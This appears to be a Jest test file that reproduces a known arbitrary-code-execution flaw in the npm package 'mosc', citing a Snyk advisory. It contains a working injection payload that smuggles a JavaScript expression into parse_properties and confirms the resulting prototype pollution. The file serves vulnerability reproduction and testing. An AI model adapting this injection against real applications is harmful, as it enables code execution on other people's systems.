//https://security.snyk.io/vuln/SNYK-JS-MOSC-571492
test("Arbitrary code execution in mosc", () => {
  const fs = require("fs");
  var A = require("mosc");

  expect({}.polluted).toBe(undefined);

  let a = new A({});
  let key = "";
  let attack_code = "1 + (Object.prototype.polluted = `yes`)";
  let properties = "{a:*1*; " + attack_code + " //*}";
  let base = "";

  try {
    a.parse_properties(key, properties, {}, {});
  } catch (error) {}

  expect({}.polluted).toBe("yes");
});
